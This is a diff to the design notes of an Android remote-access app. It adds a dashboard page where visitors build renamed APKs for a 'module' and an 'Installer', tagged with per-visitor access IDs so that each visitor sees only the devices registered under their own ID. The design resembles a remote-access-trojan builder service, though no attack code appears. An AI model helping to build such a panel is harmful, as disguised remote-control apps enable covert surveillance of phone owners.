@@ -144,4 +144,12 @@ Resource: `res/xml/accessibility_service_config_standalone.xml`
 Android build output: `app/build/outputs/apk/debug/app-debug.apk`
 Build config: `settings.gradle`, `gradle.properties`, `local.properties`, `gradle/wrapper/gradle-wrapper.properties`
 Requires: Android SDK (platform-tools, platforms;android-36, build-tools;35.0.0), Zulu JDK 17, Gradle 8.7
-Run `bash build.sh` to build — produces a single unified APK at `apk-output/RemoteAccess-debug.apk`
+Run `bash build.sh` to build — produces hardened release APKs at `apk-output/RemoteAccess-release.apk` and `apk-output/Installer-release.apk`.
+
+### Per-user customisation (Build APK page)
+- Visitors visit the **📦 Build APK** tab in the dashboard. They set 4 fields (module name + package, installer name + package); backend kicks off `build.sh` with these env vars:
+  `BUILD_ACCESS_ID`, `BUILD_MODULE_NAME`, `BUILD_MODULE_PACKAGE`, `BUILD_INSTALLER_NAME`, `BUILD_INSTALLER_PACKAGE`.
+- `build.sh` writes per-build override files (`app/build.access_id`, `app/build.app_id`, `installer/build.app_id`) and sed-replaces `app_name` in both `strings.xml` files. An `EXIT` trap restores the originals so subsequent default builds are unaffected.
+- `app/build.gradle` reads `app/build.access_id` and exposes it as `BuildConfig.ACCESS_ID`; reads `app/build.app_id` to override `applicationId`. `installer/build.gradle` reads `installer/build.app_id` for its applicationId.
+- `SocketManager.registerDevice()` includes `BuildConfig.ACCESS_ID` in the `device:register` payload. `Device` model stores `accessId` (indexed). All device list / `device:connected` / `device:disconnected` broadcasts and `/api/devices*` endpoints filter per visitor's accessId; admins see everything.
+- Final outputs are copied to `apk-output/<accessId>/Module.apk` and `apk-output/<accessId>/Installer.apk`. Endpoints: `POST /api/build/apk`, `GET /api/build/status`, `GET /api/build/download/:type` (module|installer). A global mutex serialises concurrent builds (returns 409 when busy).
